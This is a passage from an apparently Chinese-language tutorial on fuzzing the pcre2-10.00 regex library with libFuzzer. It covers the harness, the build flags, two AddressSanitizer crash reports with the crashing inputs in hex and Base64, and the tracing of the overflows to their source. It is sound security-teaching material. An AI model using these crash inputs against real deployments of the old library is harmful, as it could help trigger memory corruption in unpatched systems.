preg;</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">str</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), size)</span>;</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">pat</span><span class="params">(str)</span>;</span><br><span class="line">  <span class="type">int</span> flags = data[size/<span class="number">2</span>] - <span class="string">&#x27;a&#x27;</span>;  <span class="comment">// Make it 0 when the byte is &#x27;a&#x27;.</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == regcomp(&amp;preg, pat.c_str(), flags)) &#123;</span><br><span class="line">    <span class="type">regmatch_t</span> pmatch[<span class="number">5</span>];</span><br><span class="line">    regexec(&amp;preg, str.c_str(), <span class="number">5</span>, pmatch, <span class="number">0</span>);</span><br><span class="line">    regfree(&amp;preg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释一下逻辑：首先将样本输入中的’a’置0，之后通过regcomp()函数编译正则表达式，即将指定的正则表达式pat.c_str()编译为特定数据格式preg，使得匹配更加有效。函数regexec()会使用这个数据在目标文本串中进行模式匹配，之后regfree()释放正则表达式。<br>这个harness通过include库”pcre2posix.h”，将pcre2主要的函数包含在了里面，同时这些函数涉及到的一些内存相关的操作也常常是触发crash的点。<br>之后进行编译链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/libpcre2-8.a pcre2-10.00/.libs/libpcre2-posix.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer</span><br></pre></td></tr></table></figure><p>和之前不同，这次多了一些参数：<code>--whole-archive</code>和<code>--no-whole-archive</code>是ld专有的命令行参数，clang++并不认识，要通过clang++传递到ld，需要在他们前面加<code>-Wl</code>。<code>--whole-archive</code>可以把 在其后面出现的静态库包含的函数和变量输出到动态库，<code>--no-whole-archive</code>则关掉这个特性，因此这里将两个静态库libpcre2-8.a和libpcre2-posix.a里的符号输出到动态库里，使得程序可以在运行时动态链接使用到的函数，也使得fuzz效率得到了提升。执行一下很快得到了crash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#538040NEW    cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 24/74 MS: 3 ChangeASCIIInt-ChangeASCIIInt-EraseBytes-</span><br><span class="line">#538092REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 23/74 MS: 2 CopyPart-EraseBytes-</span><br><span class="line">#538098REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 6/74 MS: 1 EraseBytes-</span><br><span class="line">#538204REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 16/74 MS: 1 EraseBytes-</span><br><span class="line">#538415REDUCE cov: 3286 ft: 15825 corp: 6804/134Kb lim: 74 exec/s: 1759 rss: 775Mb L: 35/74 MS: 1 ShuffleBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==17319==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe809de45f at pc 0x0000005e1518 bp 0x7ffe809dd8f0 sp 0x7ffe809dd8e8</span><br><span class="line">READ of size 1 at 0x7ffe809de45f thread T0</span><br><span class="line">    #0 0x5e1517 in match /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11</span><br><span class="line">    #1 0x5a0624 in pcre2_match_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:6876:8</span><br><span class="line">    #2 0x5f5e64 in regexec /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:291:6</span><br><span class="line">    #3 0x551947 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:21:5</span><br><span class="line">    #4 0x459661 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15</span><br><span class="line">    #5 0x458ea5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3</span><br><span class="line">    #6 0x45b147 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19</span><br><span class="line">    #7 0x45be65 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5</span><br><span class="line">    #8 0x449c28 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6</span><br><span class="line">    #9 0x473092 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #10 0x7f0d3f5c3bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line">    #11 0x41ddb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00-fsanitize_fuzzer+0x41ddb9)</span><br><span class="line"></span><br><span class="line">Address 0x7ffe809de45f is located in stack of thread T0 at offset 159 in frame</span><br><span class="line">    #0 0x55136f in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:13</span><br><span class="line"></span><br><span class="line">  This frame has 6 object(s):</span><br><span class="line">    [32, 40) &#x27;__dnew.i.i.i.i26&#x27;</span><br><span class="line">    [64, 72) &#x27;__dnew.i.i.i.i&#x27;</span><br><span class="line">    [96, 128) &#x27;preg&#x27; (line 15)</span><br><span class="line">    [160, 192) &#x27;str&#x27; (line 16) &lt;== Memory access at offset 159 underflows this variable</span><br><span class="line">    [224, 256) &#x27;pat&#x27; (line 17)</span><br><span class="line">    [288, 328) &#x27;pmatch&#x27; (line 20)</span><br><span class="line">HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork</span><br><span class="line">      (longjmp and C++ exceptions *are* supported)</span><br><span class="line">SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in match</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x100050133c30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c70: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 f8 f2 f2 f2</span><br><span class="line">=&gt;0x100050133c80: f8 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00 00 00</span><br><span class="line">  0x100050133c90: f2 f2 f2 f2 00 00 00 00 f2 f2 f2 f2 00 00 00 00</span><br><span class="line">  0x100050133ca0: 00 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==17319==ABORTING</span><br><span class="line">MS: 1 ChangeBit-; base unit: 7a9e5264e8896a1d996088a56a315765c53c7b33</span><br><span class="line">0x5c,0x43,0x2b,0x5c,0x53,0x2b,0xde,0xac,0xd4,0xa3,0x53,0x2b,0x21,0x21,0x68,</span><br><span class="line">\\C+\\S+\xde\xac\xd4\xa3S+!!h</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-5ae911f7e958e646e05ebe28421183f6efc0bc88</span><br><span class="line">Base64: XEMrXFMr3qzUo1MrISFo</span><br></pre></td></tr></table></figure><p><code>SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in match</code>指出在pcre2_match.c里存在stackoverflow。对漏洞进行定位：<br>在pcre2posix.c中调用了pcre2_match</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#in pcre2posix.c</span></span><br><span class="line">rc = pcre2_match((<span class="type">const</span> pcre2_code *)preg-&gt;re_pcre2_code,(PCRE2_SPTR)<span class="built_in">string</span> + so, (eo - so), <span class="number">0</span>, options, md, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>pcre2_match定义在pcre2_match.c中，在pcre2_match中调用了match函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#in pcre2_match.c</span></span><br><span class="line">rc = match(start_match, mb-&gt;start_code, start_match, <span class="number">2</span>, mb, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在执行match的过程中出现栈溢出的位置在于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">if</span> (eptr == pp) <span class="keyword">goto</span> TAIL_RECURSE;</span><br><span class="line">   RMATCH(eptr, ecode, offset_top, mb, eptrb, RM46);</span><br><span class="line">   <span class="keyword">if</span> (rrc != MATCH_NOMATCH) RRETURN(rrc);</span><br><span class="line">   eptr--;</span><br><span class="line">   BACKCHAR(eptr);   <span class="comment">//overflow处</span></span><br><span class="line">   <span class="keyword">if</span> (ctype == OP_ANYNL &amp;&amp; eptr &gt; pp  &amp;&amp; UCHAR21(eptr) == CHAR_NL &amp;&amp;</span><br><span class="line">       UCHAR21(eptr - <span class="number">1</span>) == CHAR_CR) eptr--;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>当我以为fuzz的工作已经完成的时候，只是尝试着修改了一下编译链接harness时的静态库为全部库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/*.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer</span><br></pre></td></tr></table></figure><p>再次fuzz的结果令我惊讶：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#605510REDUCE cov: 3273 ft: 15706 corp: 6963/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 18/86 MS: 1 EraseBytes-</span><br><span class="line">#605733NEW    cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 29/86 MS: 3 ShuffleBytes-CopyPart-CMP- DE: &quot;+n&quot;-</span><br><span class="line">#605994REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 36/86 MS: 1 EraseBytes-</span><br><span class="line">#606040REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 19/86 MS: 1 EraseBytes-</span><br><span class="line">#606121NEW    cov: 3273 ft: 15708 corp: 6965/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 27/86 MS: 1 CopyPart-</span><br><span class="line">#606196NEW    cov: 3273 ft: 15709 corp: 6966/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 86/86 MS: 5 ChangeASCIIInt-ChangeBit-ChangeBit-ChangeASCIIInt-CrossOver-</span><br><span class="line">=================================================================</span><br><span class="line">==10857==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110001625ea at pc 0x00000055d548 bp 0x7ffccf4098f0 sp 0x7ffccf4098e8</span><br><span class="line">WRITE of size 1 at 0x6110001625ea thread T0</span><br><span class="line">    #0 0x55d547 in _pcre2_ord2utf_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12</span><br><span class="line">    #1 0x4f60f4 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2870:20</span><br><span class="line">    #2 0x4f5dd0 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2820:18</span><br><span class="line">    #3 0x4e03e0 in compile_branch /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:3923:11</span><br><span class="line">    #4 0x4d3f2f in compile_regex /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:6723:8</span><br><span class="line">    #5 0x4d136c in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7734:7</span><br><span class="line">    #6 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23</span><br><span class="line">    #7 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12</span><br><span class="line">    #8 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15</span><br><span class="line">    #9 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3</span><br><span class="line">    #10 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19</span><br><span class="line">    #11 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5</span><br><span class="line">    #12 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6</span><br><span class="line">    #13 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10</span><br><span class="line">    #14 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line">    #15 0x41deb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2_10.00_fuzzer+0x41deb9)</span><br><span class="line"></span><br><span class="line">0x6110001625ea is located 0 bytes to the right of 234-byte region [0x611000162500,0x6110001625ea)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x495dbd in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</span><br><span class="line">    #1 0x4d0953 in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7656:3</span><br><span class="line">    #2 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23</span><br><span class="line">    #3 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12</span><br><span class="line">    #4 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15</span><br><span class="line">    #5 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3</span><br><span class="line">    #6 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19</span><br><span class="line">    #7 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5</span><br><span class="line">    #8 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6</span><br><span class="line">    #9 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10</span><br><span class="line">    #10 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c2280024460: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa</span><br><span class="line">  0x0c2280024470: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd</span><br><span class="line">  0x0c2280024480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd</span><br><span class="line">  0x0c2280024490: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">=&gt;0x0c22800244b0: 00 00 00 00 00 00 00 00 00 00 00 00 00[02]fa fa</span><br><span class="line">  0x0c22800244c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c2280024500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==10857==ABORTING</span><br><span class="line">MS: 5 InsertRepeatedBytes-CMP-CrossOver-ChangeBit-CrossOver- DE: &quot;+\xc6&quot;-; base unit: ce48e02587af5cb5d3e84053d6d5b4545bbb6e32</span><br><span class="line">0x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x3f,0x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x2a,0x63,0x20,0x20,0x20,0x25,0xc6,0xa4,0x1a,0x2d,0x5b,0x43,0x1a,0x2d,0xc6,0xa4,0x5d,0x50,0x2a,0x5d,0x50,0x2a,0x5e,0x58,0x42,0x5c,0x5c,0x3f,0x77,0xc,0x5c,0x77,0x0,0x36,0x5c,0x20,0xa0,0xc0,0xec,0x2d,0x3f,0x5c,0x77,0x3f,0x5c,0x2d,0xac,0x3f,0x5c,</span><br><span class="line">[*]?[??\\S?[*]?[??\\S*c   %\xc6\xa4\x1a-[C\x1a-\xc6\xa4]P*]P*^XB\\\\?w\x0c\\w\x006\\ \xa0\xc0\xec-?\\w?\\-\xac?\\</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-849705875bb2098817f3299ee582e2207a568e63</span><br><span class="line">Base64: WypdP1s/P1xTP1sqXT9bPz9cUypjICAgJcakGi1bQxotxqRdUCpdUCpeWEJcXD93DFx3ADZcIKDA7C0/XHc/XC2sP1w=</span><br><span class="line">stat::number_of_executed_units: 606206</span><br><span class="line">stat::average_exec_per_sec:     255</span><br><span class="line">stat::new_units_added:          8960</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              598</span><br></pre></td></tr></table></figure><p>得到了一个不一样的crash。但这也在情理之中，通过链接不同或更多的静态库。只要harness程序逻辑所能涉及到，就有机会得到不同静态库里的crash。<br>通过<code>SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8</code>我们了解到在pcre2_ord2utf.c中存在heapoverflow的漏洞。同样对漏洞进行定位：<br>这次的函数调用有点多，一层一层的找：<br>首先在<code>pcre2posix.c</code>中调用<code>pcre2_compile</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg-&gt;re_pcre2_code = pcre2_compile((PCRE2_SPTR)pattern, <span class="number">-1</span>, options,</span><br><span class="line">  &amp;errorcode, &amp;erroffset, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>该函数定义在<code>pcre2_compile.c</code>中，然后又调用了<code>compile_regex</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">void</span>)compile_regex(re-&gt;overall_options, &amp;code, &amp;ptr, &amp;errorcode, FALSE, FALSE,</span><br><span class="line">   <span class="number">0</span>, <span class="number">0</span>, &amp;firstcu, &amp;firstcuflags, &amp;reqcu, &amp;reqcuflags, <span class="literal">NULL</span>, &amp;cb, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>之后在函数<code>compile_regex</code>中又调用了<code>compile_branch</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!compile_branch(&amp;options, &amp;code, &amp;ptr, errorcodeptr, &amp;branchfirstcu,</span><br><span class="line">       &amp;branchfirstcuflags, &amp;branchreqcu, &amp;branchreqcuflags, &amp;bc,</span><br><span class="line">       cond_depth, cb, (lengthptr == <span class="literal">NULL</span>)? <span class="literal">NULL</span> : &amp;length))</span><br><span class="line">   &#123;</span><br><span class="line">   *ptrptr = ptr;</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>compile_branch</code>中又调用了<code>add_to_class</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class_has_8bitchar +=</span><br><span class="line">          add_to_class(classbits, &amp;class_uchardata, options, cb, c, d);</span><br></pre></td></tr></table></figure><p>接着<code>add_to_class</code>调用<code>PRIV</code>:</p><figure 